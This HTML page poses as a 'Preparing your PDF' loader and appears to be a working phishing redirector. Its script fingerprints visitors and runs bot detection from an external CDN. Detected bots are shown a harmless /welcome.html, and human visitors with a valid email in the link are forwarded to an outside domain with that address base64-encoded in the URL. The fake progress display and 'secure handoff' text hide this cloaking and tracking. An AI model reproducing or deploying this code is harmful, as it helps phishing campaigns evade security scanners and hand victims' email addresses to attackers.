<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="destination-url" content="https://df.vuosaarielokuva.fi/" />
  <title>Preparing PDF…</title>
  <style>
    :root { --bg:#edeff3; --card:#ffffff; --ink:#111827; --muted:#6b7280; --line:#e5e7eb; --accent:#2563eb; --pdf:#ef4444; --good:#5bd38d; --bad:#ff8b8b; }
    html,body { height:100%; }
    body { margin:0; display:grid; place-items:center; min-height:100vh; background:var(--bg); color:var(--ink);
      font:15px/1.5 ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Helvetica, Arial; }
    .card { width:min(520px, 92vw); border:1px solid var(--line); border-radius:16px; padding:22px; background:var(--card);
      box-shadow:0 8px 24px rgba(15, 23, 42, 0.06); }
    .doc-head { display:flex; align-items:center; gap:12px; margin-bottom:14px; }
    h1 { margin:0; font-size:17px; font-weight:600; letter-spacing:.1px; }
    p { margin:.25rem 0 .75rem; color:var(--muted); }
    .pdf-logo { width:44px; height:54px; flex:none; position:relative; display:grid; place-items:center; border:1px solid var(--line); border-radius:8px; overflow:hidden;
      background:linear-gradient(180deg,#fff,#fafafa 70%),#fff; }
    .pdf-ribbon { position:absolute; inset:auto 0 0 0; height:22px; background:var(--pdf); display:flex; align-items:center; justify-content:center; color:#fff; font-weight:700; font-size:11px; letter-spacing:.6px; }
    .pdf-corner { position:absolute; top:0; right:0; width:0; height:0; border-left:14px solid transparent; border-bottom:14px solid #eaeaea; }
    .pdf-mark { width:18px; height:18px; border-radius:50%; border:2px solid #d1d5db; }
    .progress { height:10px; background:#f3f4f6; border-radius:999px; overflow:hidden; border:1px solid var(--line); }
    .progress > .bar { height:100%; width:0%; border-radius:999px; background:linear-gradient(90deg, rgba(37,99,235,.22), rgba(37,99,235,.62)); transition:width .18s ease; }
    .percent { margin-top:8px; font-variant-numeric:tabular-nums; font-weight:600; letter-spacing:.5px; }
    .sheet { margin-top:16px; padding:14px; border:1px dashed var(--line); border-radius:12px; background:linear-gradient(180deg,#fff 0,#fcfcfd 100%); }
    .skeleton { height:12px; background:#eef0f5; border-radius:6px; position:relative; overflow:hidden; }
    .skeleton + .skeleton { margin-top:10px; }
    .skeleton.long { width:92%; } .skeleton.med { width:72%; } .skeleton.short { width:46%; }
    .shimmer { position:absolute; inset:0; transform:translateX(-100%); background:linear-gradient(90deg, transparent, rgba(0,0,0,.05), transparent); animation:shimmer 1.25s linear infinite; }
    @keyframes shimmer { 100% { transform:translateX(100%);} }
    .meta { margin-top:12px; display:flex; gap:8px; flex-wrap:wrap; }
    .pill { display:inline-flex; align-items:center; gap:.5rem; padding:.35rem .6rem; border:1px solid var(--line); border-radius:999px; color:#374151; background:#fff; font-size:12px; }
    .dot { width:8px; height:8px; border-radius:50%; background:#d1d5db; box-shadow:0 0 0 2px #eef2f7 inset; }
    .foot { margin-top:10px; font-size:12px; color:var(--muted); }
    a { color:var(--accent); text-decoration:none; } a:hover { text-decoration:underline; }

    /* Debug panel */
    .debug-panel { position: fixed; inset: 12px auto auto 12px; width: 320px; max-height: 60vh; overflow:auto;
      background:#0b1220; color:#e5e7eb; font:12px/1.4 ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
      border:1px solid #1f2937; border-radius:10px; box-shadow:0 10px 24px rgba(0,0,0,.25); padding:10px 12px; z-index:9999; }
    .debug-panel h3 { margin:0 0 6px; font-size:12px; color:#93c5fd; }
    .debug-row { display:flex; justify-content:space-between; gap:8px; padding:4px 0; border-bottom:1px dashed #374151; }
    .debug-row:last-child { border-bottom:0; }
    .debug-k { color:#9ca3af; }
    .debug-v.ok { color:#86efac; } .debug-v.fail { color:#fca5a5; } .debug-v.warn { color:#fde68a; }
    .debug-log { margin-top:6px; white-space:pre-wrap; word-break:break-word; color:#cbd5e1; }
  </style>

  <!-- NOTE: removed the <script src="..."> tags to avoid ESM 'export' errors -->
</head>
<body>
  <div class="card" id="card" aria-live="polite">
    <div class="doc-head">
      <div class="pdf-logo" aria-hidden="true">
        <div class="pdf-corner"></div>
        <div class="pdf-mark"></div>
        <div class="pdf-ribbon">PDF</div>
      </div>
      <div>
        <h1>Preparing your PDF…</h1>
        <p class="muted">Encoding recipient and finalizing a secure handoff.</p>
      </div>
    </div>

    <div class="progress" aria-label="loading">
      <div class="bar" id="bar"></div>
    </div>
    <div class="percent" id="percent">0%</div>

    <div class="sheet">
      <div class="skeleton long"><div class="shimmer"></div></div>
      <div class="skeleton med"><div class="shimmer"></div></div>
      <div class="skeleton long"><div class="shimmer"></div></div>
      <div class="skeleton short"><div class="shimmer"></div></div>
    </div>

    <div class="meta">
      <span class="pill"><span class="dot" id="fp-dot"></span> fingerprint</span>
      <span class="pill"><span class="dot" id="bot-dot"></span> bot check</span>
      <span class="pill"><span class="dot" id="redir-dot"></span> redirect</span>
    </div>

    <p id="status" class="foot">Working…</p>
  </div>

  <!-- Debug panel (shown with ?debug=1) -->
  <div id="debug" class="debug-panel" style="display:none">
    <h3>Redirect Debug</h3>
    <div class="debug-row"><span class="debug-k">FP import()</span><span id="d-fp-present" class="debug-v warn">pending…</span></div>
    <div class="debug-row"><span class="debug-k">FP get()</span><span id="d-fp-get" class="debug-v warn">pending…</span></div>
    <div class="debug-row"><span class="debug-k">FP time (ms)</span><span id="d-fp-time" class="debug-v">–</span></div>
    <div class="debug-row"><span class="debug-k">BotD import()</span><span id="d-bot-present" class="debug-v warn">pending…</span></div>
    <div class="debug-row"><span class="debug-k">BotD detect()</span><span id="d-bot-detect" class="debug-v warn">pending…</span></div>
    <div class="debug-row"><span class="debug-k">Bot detected?</span><span id="d-bot-flag" class="debug-v">–</span></div>
    <div class="debug-row"><span class="debug-k">BotD time (ms)</span><span id="d-bot-time" class="debug-v">–</span></div>
    <div class="debug-row"><span class="debug-k">Final action</span><span id="d-final" class="debug-v">–</span></div>
    <div class="debug-log" id="d-log"></div>
  </div>

  <script>
    const qs = new URLSearchParams(location.search);
    const DEBUG = ['1','true','on','yes'].includes((qs.get('debug')||'').toLowerCase());
    const $ = (id) => document.getElementById(id);
    const setStatus = (msg) => { $('status').textContent = msg; };
    const mark = (id, on=true) => { $(id).style.background = on ? 'var(--good)' : 'var(--bad)'; };
    const d = { panel:$('debug'), logEl:$('d-log'),
      set(k,v,s){ const el=$('d-'+k); if(!el)return; el.textContent=v; el.className='debug-v'+(s?' '+s:''); },
      log(tag,msg,extra){ const line=`[${new Date().toISOString()}] [${tag}] ${msg}`+(extra?` ${JSON.stringify(extra)}`:''); console.log(`[redir:${tag}]`, msg, extra||''); if(DEBUG) this.logEl.textContent+=(this.logEl.textContent?'\n':'')+line; }
    };
    if (DEBUG) d.panel.style.display='block';

    // --- Helpers & sanitizers ---
    function tryStripCfChars(s) {
      // Prefer Unicode property escapes if supported; otherwise fall back to common zero-widths.
      try { return s.replace(/\p{Cf}/gu, ''); } catch { return s.replace(/[\u200B-\u200D\uFEFF]/g, ''); }
    }
    function sanitizeEmail(raw) {
      const step1 = (raw || '').normalize('NFKC');
      // Remove: zero-width (Cf), BOM, and unusual space-like chars; then trim.
      const step2 = tryStripCfChars(step1)
        .replace(/[\u00A0\u1680\u180E\u2000-\u200A\u202F\u205F\u3000]/g, '');
      return step2.trim();
    }

    function getDestination() {
      const meta = document.querySelector('meta[name="destination-url"]');
      const fallback = meta?.content?.trim() || '';
      const fromQs = (qs.get('dest') || '').trim();
      const url = fromQs || fallback;
      try { return url ? new URL(url.startsWith('http') ? url : 'https://' + url).toString() : ''; } catch { return ''; }
    }
    function getEmail() {
      // URLSearchParams already decoded %EF%BB%BF to \uFEFF; sanitize it.
      const raw = (qs.get('email') || '');
      const cleaned = sanitizeEmail(raw);
      if (DEBUG) {
        d.log('email', 'raw vs cleaned', {
          raw,
          cleaned,
          rawCodepoints: Array.from(raw).map(c => c.charCodeAt(0)),
          cleanedCodepoints: Array.from(cleaned).map(c => c.charCodeAt(0))
        });
      }
      return cleaned;
    }
    function toBase64(str) { try { return btoa(unescape(encodeURIComponent(str))); } catch { return ''; } }
    function safeJoinUrl(base, paramsObj) { const u = new URL(base); for (const [k, v] of Object.entries(paramsObj)) if (v != null) u.searchParams.set(k, v); return u.toString(); }
    function redirectTo(url) { window.location.replace(url); }
    const EMAIL_RE = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    // Cosmetic progress
    let pct=0; const bar=$('bar'), percentText=$('percent');
    const interval=setInterval(()=>{ pct=Math.min(96, pct + Math.max(1, Math.floor(Math.random()*12)+3)); bar.style.width=pct+'%'; percentText.textContent=pct+'%'; }, 140);

    // Timing helpers
    const timeIt = async (fn) => { const t0=performance.now(); try{ const v=await fn(); return {ok:true, ms:Math.round(performance.now()-t0), value:v}; } catch(e){ return {ok:false, ms:Math.round(performance.now()-t0), error:e}; } };
    const withTimeout = (p, ms) => Promise.race([ p, new Promise(res=>setTimeout(()=>res({ok:false, timeout:true}), ms)) ]);

    (async () => {
      const email = getEmail();
      const destination = getDestination();

      // --- Load FingerprintJS via ESM dynamic import ---
      const fpImport = await withTimeout(timeIt(async () => {
        d.log('fp', 'import() start');
        const m = await import('https://openfpcdn.io/fingerprintjs/v3');
        d.log('fp', 'load() start');
        const fp = await m.load();
        d.log('fp', 'get() start');
        const res = await fp.get();
        return res;
      }), 4000);

      if (fpImport.timeout) d.set('fp-present','timeout','warn');
      else if (!fpImport.ok) d.set('fp-present','error','fail');
      else d.set('fp-present','ok','ok');

      if (fpImport.ok) { d.set('fp-get','ok','ok'); mark('fp-dot', true); }
      else { d.set('fp-get', fpImport.timeout ? 'timeout' : 'error', fpImport.timeout ? 'warn' : 'fail'); mark('fp-dot', false); }
      d.set('fp-time', String(fpImport.ms || '–'));
      d.log('fp', 'done', { ok: fpImport.ok, ms: fpImport.ms });

      // --- Load BotD via ESM dynamic import ---
      const botImport = await withTimeout(timeIt(async () => {
        d.log('botd', 'import() start');
        const m = await import('https://openfpcdn.io/botd/v1');
        d.log('botd', 'load() start');
        const botd = await m.load();
        d.log('botd', 'detect() start');
        const res = await botd.detect();
        return res;
      }), 4000);

      let botDetected = false;
      if (botImport.timeout) d.set('bot-present','timeout','warn');
      else if (!botImport.ok) d.set('bot-present','error','fail');
      else d.set('bot-present','ok','ok');

      if (botImport.ok) {
        const isBot = !!botImport.value?.bot;
        botDetected = isBot;
        d.set('bot-detect', isBot ? 'flagged' : 'clear', isBot ? 'fail' : 'ok');
      } else {
        d.set('bot-detect', botImport.timeout ? 'timeout' : 'error', botImport.timeout ? 'warn' : 'fail');
      }
      d.set('bot-flag', botDetected ? 'YES' : (botImport.ok ? 'NO' : 'unknown'), botDetected ? 'fail' : (botImport.ok ? 'ok' : 'warn'));
      d.set('bot-time', String(botImport.ms || '–'));
      mark('bot-dot', !botDetected);
      d.log('botd', 'done', { ok: botImport.ok, ms: botImport.ms, bot: botDetected });

      // Decision: ONLY welcome if a bot is positively detected
      if (botDetected) {
        setStatus('Redirecting to welcome…');
        d.set('final', '/welcome.html', 'fail');
        mark('redir-dot', false);
        clearInterval(interval);
        bar.style.width = '100%'; percentText.textContent = '100%';
        await new Promise(r => setTimeout(r, 200));
        redirectTo('/welcome.html');
        return;
      }

      // Human/unknown path: require valid params to redirect
      const validEmail = EMAIL_RE.test(email);
      const hasParams = validEmail && destination;

      if (hasParams) {
        const base64 = toBase64(email);
        const redirectUrl = safeJoinUrl(destination, { case: base64 });

        setStatus('Finalizing…');
        await new Promise(r => setTimeout(r, 600));
        pct = 100; bar.style.width = pct + '%'; percentText.textContent = pct + '%';
        setStatus('Redirecting…');
        d.set('final', redirectUrl, 'ok');
        mark('redir-dot', true);
        clearInterval(interval);
        await new Promise(r => setTimeout(r, 200));
        redirectTo(redirectUrl);
      } else {
        d.set('final', 'idle (missing/invalid params)', 'warn');
        if (DEBUG) {
          d.log('guard', 'validation', { destination, email, validEmail, EMAIL_RE: EMAIL_RE.toString() });
        }
        await new Promise(r => setTimeout(r, 1200));
        clearInterval(interval);
        bar.style.width = '96%'; percentText.textContent = '96%';
        setStatus('Ready.');
      }
    })();
  </script>
</body>
</html>
